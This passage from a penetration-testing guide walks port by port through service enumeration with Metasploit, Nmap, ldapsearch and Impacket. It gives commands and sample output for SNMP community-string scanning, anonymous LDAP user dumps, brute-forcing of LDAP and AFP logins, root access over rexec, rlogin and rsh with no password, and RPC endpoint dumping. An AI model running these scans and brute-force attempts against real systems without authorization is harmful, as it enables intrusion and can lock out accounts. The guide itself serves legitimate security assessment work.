[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
[+] 10.10.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
[*] Scanned 24 of 58 hosts (41% complete)
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: private (Access level: read-write); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[+] 10.11.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): ExtremeXOS version 12.2.2.11 v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
[*] Scanned 29 of 58 hosts (50% complete)
[*] Scanned 35 of 58 hosts (60% complete)
[*] Scanned 41 of 58 hosts (70% complete)
[*] Scanned 47 of 58 hosts (81% complete)
[+] 10.25.xx.xx:161 - LOGIN SUCCESSFUL: public (Access level: read-only); Proof (sysDescr.0): Digi Connect ME Version 82000856_F6 07/21/2006
```
</li>

<li>Next we can use <strong>SNMP Enumeration Module</strong> to enumerate the devices for which we have found the community strings 
```
use auxiliary/scanner/snmp/snmp_enum
creds -p 161 -R
```

Sample Output:
```
[+] 10.11.xx.xx, Connected.

[*] System information:

Host IP                       : 10.11.xx.xx
Hostname                      : X150-24t
Description                   : ExtremeXOS version 12.2.xx.xx v1222b11 by release-manager on Mon Mar 23 17:54:47 PDT 2009
Contact                       : support@extremenetworks.com, +1 888 257 3000
Location                      : -
Uptime snmp                   : -
Uptime system                 : 206 days, 00:20:58.04
System date                   : -

[*] Network information:

IP forwarding enabled         : no
Default TTL                   : 64
TCP segments received         : 6842
TCP segments sent             : 6837
TCP segments retrans          : 0
Input datagrams               : 243052379
Delivered datagrams           : 192775346
Output datagrams              : 993667
```
</li>
</ol>


###Check Point FireWall-1 Topology | Port 264 

<strong>Metasploit</strong> has
<ol>
<li><strong>CheckPoint Firewall-1 SecuRemote Topology Service Hostname Disclosure</strong> This module sends a query to the port 264/TCP on CheckPoint Firewall-1 firewalls to obtain the firewall name and management station (such as SmartCenter) name via a pre-authentication request
```
use auxiliary/gather/checkpoint_hostname
set RHOST 10.10.xx.xx
```
Sample Output
```
[*] Attempting to contact Checkpoint FW1 SecuRemote Topology service...
[+] Appears to be a CheckPoint Firewall...
[+] Firewall Host: FIREFIGHTER-SEC
[+] SmartCenter Host: FIREFIGHTER-MGMT.example.com
[*] Auxiliary module execution completed
```
</li>
</ol>

###LDAP | Port 389

Nmap has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/ldap-rootdse.html">ldap-rootdse.nse</a>: Retrieves the LDAP root DSA-specific Entry (DSE)
Sample Output:

```
nmap -p 389 --script ldap-rootdse <host>
nmap -p 389 --script ldap-rootdse 172.16.xx.xx

Starting Nmap 7.01 ( https://nmap.org ) at 2016-05-03 23:05 IST
Nmap scan report for 172.16.xx.xx
Host is up (0.015s latency).
PORT    STATE SERVICE
389/tcp open  ldap
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       currentTime: 20160503173447.0Z
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       dsServiceName: CN=NTDS Settings,CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: DC=xxxpcx,DC=com
|       namingContexts: CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       namingContexts: DC=DomainDnsZones,DC=xxxpcx,DC=com
|       namingContexts: DC=ForestDnsZones,DC=xxxpcx,DC=com
|       defaultNamingContext: DC=xxxpcx,DC=com
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=xxxpcx,DC=com
|       configurationNamingContext: CN=Configuration,DC=xxxpcx,DC=com
|       rootDomainNamingContext: DC=xxxpcx,DC=com
|       supportedControl: 1.2.xx.xx.1.4.319
|       supportedControl: 1.2.xx.xx.1.4.801
|       supportedControl: 1.2.xx.xx.1.4.473
|       supportedControl: 1.2.xx.xx.1.4.528
|       supportedControl: 1.2.xx.xx.1.4.417
|       supportedControl: 1.2.xx.xx.1.4.619
|       supportedControl: 1.2.xx.xx.1.4.841
|       supportedControl: 1.2.xx.xx.1.4.529
|       supportedControl: 1.2.xx.xx.1.4.805
|       supportedControl: 1.2.xx.xx.1.4.521
|       supportedControl: 1.2.xx.xx.1.4.970
|       supportedControl: 1.2.xx.xx.1.4.1338
|       supportedControl: 1.2.xx.xx.1.4.474
|       supportedControl: 1.2.xx.xx.1.4.1339
|       supportedControl: 1.2.xx.xx.1.4.1340
|       supportedControl: 1.2.xx.xx.1.4.1413
|       supportedControl: 2.16.xx.xx.113730.3.4.9
|       supportedControl: 2.16.xx.xx.113730.3.4.10
|       supportedControl: 1.2.xx.xx.1.4.1504
|       supportedControl: 1.2.xx.xx.1.4.1852
|       supportedControl: 1.2.xx.xx.1.4.802
|       supportedControl: 1.2.xx.xx.1.4.1907
|       supportedControl: 1.2.xx.xx.1.4.1948
|       supportedControl: 1.2.xx.xx.1.4.1974
|       supportedControl: 1.2.xx.xx.1.4.1341
|       supportedControl: 1.2.xx.xx.1.4.2026
|       supportedControl: 1.2.xx.xx.1.4.2064
|       supportedControl: 1.2.xx.xx.1.4.2065
|       supportedControl: 1.2.xx.xx.1.4.2066
|       supportedControl: 1.2.xx.xx.1.4.2090
|       supportedControl: 1.2.xx.xx.1.4.2205
|       supportedControl: 1.2.xx.xx.1.4.2204
|       supportedControl: 1.2.xx.xx.1.4.2206
|       supportedControl: 1.2.xx.xx.1.4.2211
|       supportedControl: 1.2.xx.xx.1.4.2239
|       supportedControl: 1.2.xx.xx.1.4.2255
|       supportedControl: 1.2.xx.xx.1.4.2256
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       highestCommittedUSN: 70892
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       dnsHostName: SCN-DC01.xxxpcx.com
|       ldapServiceName: xxxpcx.com:scn-dc01$@xxxpcx.COM
|       serverName: CN=SCN-DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=xxxpcx,DC=com
|       supportedCapabilities: 1.2.xx.xx.1.4.800
|       supportedCapabilities: 1.2.xx.xx.1.4.1670
|       supportedCapabilities: 1.2.xx.xx.1.4.1791
|       supportedCapabilities: 1.2.xx.xx.1.4.1935
|       supportedCapabilities: 1.2.xx.xx.1.4.2080
|       supportedCapabilities: 1.2.xx.xx.1.4.2237
|       isSynchronized: TRUE
|       isGlobalCatalogReady: TRUE
|       domainFunctionality: 3
|       forestFunctionality: 3
|_      domainControllerFunctionality: 6

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds

```</li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search.nse</a>: Attempts to perform an LDAP search and returns all matches.

If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.

Sample Output:
```
nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
ldap.qfilter=users,ldap.attrib=sAMAccountName' <host>

nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' <host>
```</li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-brute.html">ldap-brute.nse</a>: Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments.

This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceed the amount of allowed tries, accounts will be locked out. This usually happens very quickly.</li>
</ol>

Anonymous LDAP Binding allows a client to connect and search the directory ( bind and search) without logging in. You do not need to include binddn and bindpasswd.

If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query
```
ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
-h ldap server
-p port of ldap
-x simple authentication
-b search base
-s scope is defined as base
```

Sample Output
```
 ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
# extended LDIF
#
# LDAPv3
# base <> with scope baseObject
# filter: (objectClass=*)
# requesting: * + 
#

#
dn:
objectClass: top
objectClass: OpenLDAProotDSE
structuralObjectClass: OpenLDAProotDSE
configContext: cn=config
namingContexts: dc=example,dc=com
supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1
supportedControl: 2.16.xx.xx.113730.3.4.18
supportedControl: 2.16.xx.xx.113730.3.4.2
supportedControl: 1.3.xx.xx.4.1.4203.1.10.1
supportedControl: 1.2.xx.xx.1.4.319
supportedControl: 1.2.xx.xx.1.334810.2.3
supportedControl: 1.2.xx.xx.1.3344810.2.3
supportedControl: 1.3.xx.xx.1.13.2
supportedControl: 1.3.xx.xx.1.13.1
supportedControl: 1.3.xx.xx.1.12
supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1
supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3
supportedFeatures: 1.3.xx.xx.1.14
supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1
supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2
supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3
supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4
supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5
supportedLDAPVersion: 3
entryDN:
subschemaSubentry: cn=Subschema

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

Once you are aware of the base name in the above example "example.com" we can query for ldap users etc. by

```
ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"
```
Sample Output
```
# johnsmith, EXAUSERS, People, example.com
dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com
displayName: John Smith
ntUserLastLogon: 130150432350834365
givenName: John
objectClass: top
objectClass: person
objectClass: organizationalperson
objectClass: inetOrgPerson
objectClass: ntUser
objectClass: shadowAccount
uid: johnsmith
cn: John Smith
ntUserCodePage: 0
ntUserDomainId: johnsmith
ntUserLastLogoff: 0
ntUniqueId: 75ac21092c755e42b2129a224eb328dd
ntUserDeleteAccount: true
ntUserAcctExpires: 9223372036854775807
sn: John
```

Things to add in LDAP -- User authentication and Jxplorer

###SMB | Port 445

<strong>Metasploit</strong> has

<ol>
<li><strong>SMB Version Detection</strong> which provides the operating system version.
```
use auxiliary/scanner/smb/smb_version
services -p 445 -R
```
Sample Output:
```
[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BPC13B0843) (domain:XXX)
[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BWK14F0040) (domain:XXX)
```
</li>
</ol>

###rexec | Port 512

<strong>Metasploit</strong> has
<ol>
<li><strong>rexec Authentication Scanner</strong> to find if there is any open shell.

```
auxiliary/scanner/rservices/rexec_login
services -p 512 -u -R
```
Sample output with the username root and empty password:
```
[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
[-] Result: Where are you?
[*] 10.10.xx.xx:512 - Starting rexec sweep
[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
[*] 10.10.xx.xx:512 - Starting rexec sweep
[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
[+] 10.10.xx.xx:512, rexec 'root' : ''
```

The above can be accessed using
```
rlogin <ipaddress>
```
</li>

</ol>


<strong>Nmap</strong> has 
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rexec-brute.html">rexec-brute.nse</a>: Performs brute force password auditing against the classic UNIX rexec (remote exec) service.

```
nmap -p 512 --script rexec-brute <ip>
```</li>
</ol>

###rlogin | Port 513
<strong>Metasploit</strong> has
<ol>
<li><strong>rlogin Authentication Scanner</strong>
```
use auxiliary/scanner/rservices/rlogin_login
services -p 513 -u -R
```
Sample Output:
```
[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.
[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.
```
Note: In a recent engagement just doing the "rlogin IP" using the root shell provided me the root shell, where-as few IP address asked for password. Also, One IP for which rexec_login shows failed, was able to login using rlogin.

Maybe refer: Metasploitable 2 : DOC-1875 document.
</li>
</ol>


###RSH | port 514

<strong>Metasploit</strong> has 
<ol>
<li><strong>rsh Authentication Scanner</strong>
```
use auxiliary/scanner/rservices/rsh_login
services -p 514 -u -R
```
Sample Output
```
[+] 10.10.xx.xx:514, rsh 'root' from 'root' with no password.
[*] 10.11.xx.xx:514 RSH - Attempting rsh with username 'root' from 'root'
[+] 10.11.xx.xx:514, rsh 'root' from 'root' with no password.
```

Sample Run:
```
 rsh 10.11.xx.xx whoami
Integrated PrintNet Enterprise
```</li>
</ol>

###AFP | Apple Filing Protocol | Port 548

AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.

<strong>Metasploit</strong> has two auxiliary modules available.

<ol>
<li><strong>Apple Filing Protocol Info Enumerator</strong>: 

```
use auxiliary/scanner/afp/afp_server_info
services -p 548 -u -S AFP -R
```
Sample output:
```
[*] AFP 10.11.xx.xx Scanning...
[*] AFP 10.11.xx.xx:548:548 AFP:
[*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule 
[*] AFP 10.11.xx.xx:548  Server Flags: 
[*] AFP 10.11.xx.xx:548     *  Super Client: true 
[*] AFP 10.11.xx.xx:548     *  UUIDs: true 
[*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true 
[*] AFP 10.11.xx.xx:548     *  Open Directory: true 
[*] AFP 10.11.xx.xx:548     *  Reconnect: true 
[*] AFP 10.11.xx.xx:548     *  Server Notifications: true 
[*] AFP 10.11.xx.xx:548     *  TCP/IP: true 
[*] AFP 10.11.xx.xx:548     *  Server Signature: true 
[*] AFP 10.11.xx.xx:548     *  Server Messages: true 
[*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false 
[*] AFP 10.11.xx.xx:548     *  Password Changing: true 
[*] AFP 10.11.xx.xx:548     *  Copy File: true 
[*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119 
[*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1 
[*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1
[*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d
[*] AFP 10.11.xx.xx:548  Server Network Address: 
[*] AFP 10.11.xx.xx:548     *  10.11.4.76:548 
[*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548 
[*] AFP 10.11.xx.xx:548     *  10.11.4.76 
[*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example's AirPort Time Capsule
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
</li>
<li><strong>Apple Filing Protocol Login Utility</strong> which attempts to bruteforce authentication credentials for AFP.
</li>
</ol>

In <strong>Nmap</strong>, we have
<ol>
<li><a href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html">afp-serverinfo.nse</a>: Shows AFP server information.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-brute.html">afp-brute.nse</a>: Performs password guessing against Apple Filing Protocol (AFP).</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-ls.html">afp-ls.nse</a>: Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-showmount.html">afp-showmount.nse</a>: Shows AFP shares and ACLs.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html">afp-path-vuln.nse</a>: Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.</li>
</ol>

###Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593

Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.

<strong>Metasploit</strong> has

<ol>
<li><strong>Endpoint Mapper Service Discovery</strong>: This module can be used to obtain information from the Endpoint Mapper service
```
use auxiliary/scanner/dcerpc/endpoint_mapper
```</li>
<li><strong>Hidden DCERPC Service Discovery</strong>:   This module will query the endpoint mapper and make a list of all ncacn_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.
```
use auxiliary/scanner/dcerpc/hidden
```
</li>
<li><strong>Remote Management Interface Discovery</strong>:   This module can be used to obtain information from the Remote Management Interface DCERPC service.
```
use auxiliary/scanner/dcerpc/management
```
</li>
<li><strong>DCERPC TCP Service Auditor</strong>: Determine what DCERPC services are accessible over a TCP port.

```
use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor
```
</li>
</ol>
We can use <strong>rpcdump</strong> from <strong>Impacket</strong> to dump the RPC information. This tool can communicate over Port 135,139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.

```
Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]
                  target [{445/SMB,135/TCP,139/SMB}]

Dumps the remote RPC endpoints information
```
Sample Output:
```
rpcdump.py 10.10.xx.xx
Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies

[*] Retrieving endpoint list from 10.10.xx.xx
[*] Trying protocol 135/TCP...
Protocol: N/A  	
Provider: iphlpsvc.dll 
UUID    : 552D076A-CB29-4E44-8B6A-D15E59E2C0AF v1.0 IP Transition Configuration endpoint
Bindings: 
          ncacn_np:\\ADS[\PIPE\srvsvc]
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: schedsvc.dll 
UUID    : 0A74EF1C-41A4-4E06-83AE-DC74FB1CDD53 v1.0 
Bindings: 
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: nsisvc.dll 
UUID    : 7EA70BCF-48AF-4F6A-8968-6A440754D5FA v1.0 NSI server endpoint
Bindings: 
          ncalrpc:[LRPC-37912a0de47813b4b3]
          ncalrpc:[OLE6ECE1F6A513142EC99562256F849]

Protocol: [MS-CMPO]: MSDTC Connection Manager: 
Provider: msdtcprx.dll 
UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0 
Bindings: 
          ncalrpc:[LRPC-316e773cde064c1ede]
          ncalrpc:[LRPC-316e773cde064c1ede]
          ncalrpc:[LRPC-316e773cde064c1ede]
          ncalrpc:[LRPC-316e773cde064c1ede]

Protocol: N/A 
Provider: dhcpcsvc6.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D6 v1.0 DHCPv6 Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.10.xx.xx[49153]
          ncacn_np:\\ADS[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: N/A 
Provider: nrpsrv.dll 
UUID    : 30ADC50C-5CBC-46CE-9A0E-91914789E23C v1.0 NRP server endpoint
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49153]
          ncacn_np:\\ADS[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: [MS-RSP]: Remote Shutdown Protocol 
Provider: wininit.exe 
UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49152]
          ncalrpc:[WindowsShutdown]
          ncacn_np:\\ADS[\PIPE\InitShutdown]
          ncalrpc:[WMsgKRpc07EB30]

Protocol: N/A 
Provider: authui.dll 
UUID    : 24019106-A203-4642-B88D-82DAE9158929 v1.0 
Bindings: 
          ncalrpc:[LRPC-21f4d30ba4239e8f6e]

Protocol: N/A 
Provider: gpsvc.dll 
UUID    : 2EB08E3E-639F-4FBA-97B1-14F878961076 v1.0 
Bindings: 
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: BFE.DLL 
UUID    : DD490425-5325-4565-B774-7E27D6C09C24 v1.0 Base Firewall Engine API
Bindings: 
          ncalrpc:[LRPC-5409763072e46c4586]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: schedsvc.dll 
UUID    : 86D35949-83C9-4044-B424-DB363231FD0C v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: ntfrs.exe 
UUID    : A00C021C-2BE2-11D2-B678-0000F87A8F8E v1.0 PERFMON SERVICE
Bindings: 
          ncalrpc:[LRPC-77115559ab3225edd1]
          ncacn_ip_tcp:10.10.xx.xx[49161]
          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]

Protocol: [MS-DRSR]: Directory Replication Service (DRS) Remote Protocol 
Provider: ntdsai.dll 
UUID    : E3514235-4B06-11D1-AB04-00C04FC2DCD2 v4.0 MS NT Directory DRS Interface
Bindings: 
          ncacn_http:10.10.xx.xx[49157]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
          ncacn_ip_tcp:10.10.xx.xx[49155]
          ncalrpc:[samss lpc]
          ncalrpc:[dsrole]
          ncacn_np:\\ADS[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
          ncacn_np:\\ADS[\pipe\lsass]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 378E52B0-C0A9-11CF-822D-00AA0051E40F v1.0 
Bindings: 
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: [MS-DNSP]: Domain Name Service (DNS) Server Management 
Provider: dns.exe 
UUID    : 50ABC2A4-574D-40B3-9D66-EE4FD5FBA076 v5.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49166]

Protocol: [MS-PAN]: Print System Asynchronous Notification Protocol 
Provider: spoolsv.exe 
UUID    : 0B6EDBFA-4A24-4FC6-8A23-942B1ECA65D1 v1.0 Spooler function endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: [MS-TSCH]: Task Scheduler Service Remoting Protocol 
Provider: taskcomp.dll 
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 
Bindings: 
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: spoolsv.exe 
UUID    : 4A452661-8290-4B36-8FBE-7F4093A94978 v1.0 Spooler function endpoint
Bindings: 
          ncalrpc:[spoolss]

Protocol: N/A 
Provider: keyiso.dll 
UUID    : B25A52BF-E5DD-4F4A-AEA6-8CA7272A0E86 v1.0 KeyIso
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49158]
          ncacn_http:10.10.xx.xx[49157]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
          ncacn_ip_tcp:10.10.xx.xx[49155]
          ncalrpc:[samss lpc]
          ncalrpc:[dsrole]
          ncacn_np:\\ADS[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
          ncacn_np:\\ADS[\pipe\lsass]

Protocol: [MS-FRS1]: File Replication Service Protocol 
Provider: ntfrs.exe 
UUID    : D049B186-814F-11D1-9A3C-00C04FC9B232 v1.1 NtFrs API
Bindings: 
          ncalrpc:[LRPC-77115559ab3225edd1]
          ncacn_ip_tcp:10.10.xx.xx[49161]
          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]

Protocol: [MS-SAMR]: Security Account Manager (SAM) Remote Protocol 
Provider: samsrv.dll 
UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49158]
          ncacn_http:10.10.xx.xx[49157]
          ncalrpc:[NTDS_LPC]
          ncalrpc:[OLEAE08BC51A54440268646C1D21882]
          ncacn_ip_tcp:10.10.xx.xx[49155]
          ncalrpc:[samss lpc]
          ncalrpc:[dsrole]
          ncacn_np:\\ADS[\PIPE\protected_storage]
          ncalrpc:[protected_storage]
          ncalrpc:[lsasspirpc]
          ncalrpc:[lsapolicylookup]
          ncalrpc:[LSARPC_ENDPOINT]
          ncalrpc:[securityevent]
          ncalrpc:[audit]
          ncalrpc:[LRPC-4fe30eeeeebfea13c2]
          ncacn_np:\\ADS[\pipe\lsass]

Protocol: [MS-SCMR]: Service Control Manager Remote Protocol 
Provider: services.exe 
UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49168]

Protocol: [MS-FRS1]: File Replication Service Protocol 
Provider: ntfrs.exe 
UUID    : F5CC59B4-4264-101A-8C59-08002B2F8426 v1.1 NtFrs Service
Bindings: 
          ncalrpc:[LRPC-77115559ab3225edd1]
          ncacn_ip_tcp:10.10.xx.xx[49161]
          ncalrpc:[OLE7A4789AA2E3C4A59AC310EF3185A]

Protocol: N/A 
Provider: IKEEXT.DLL 
UUID    : A398E520-D59A-4BDD-AA7A-3C1E0303A511 v1.0 IKE/Authip API
Bindings: 
          ncacn_np:\\ADS[\PIPE\srvsvc]
          ncacn_ip_tcp:10.10.xx.xx[49154]
          ncacn_np:\\ADS[\PIPE\atsvc]
          ncalrpc:[senssvc]
          ncalrpc:[OLEEC91239AB64E4F319A44EB95228B]
          ncalrpc:[IUserProfile2]

Protocol: N/A 
Provider: winlogon.exe 
UUID    : 12E65DD8-887F-41EF-91BF-8D816C42C2E7 v1.0 Secure Desktop LRPC interface
Bindings: 
          ncalrpc:[WMsgKRpc0530E42]

Protocol: N/A 
Provider: dhcpcsvc.dll 
UUID    : 3C4728C5-F0AB-448B-BDA1-6CE01EB0A6D5 v1.0 DHCP Client LRPC Endpoint
Bindings: 
          ncalrpc:[dhcpcsvc]
          ncalrpc:[dhcpcsvc6]
          ncacn_ip_tcp:10.10.xx.xx[49153]
          ncacn_np:\\ADS[\pipe\eventlog]
          ncalrpc:[eventlog]

Protocol: [MS-ICPR]: ICertPassage Remote Protocol 
Provider: certsrv.exe 
UUID    : 91AE6020-9E3C-11CF-8D7C-00AA00C091BE v0.0 
Bindings: 
          ncacn_ip_tcp:10.10.xx.xx[49197]
          ncacn_np:\\ADS[\pipe\cert]
          ncalrpc:[OLEC5F09EAC9DB745C58B8411EC2BA2]

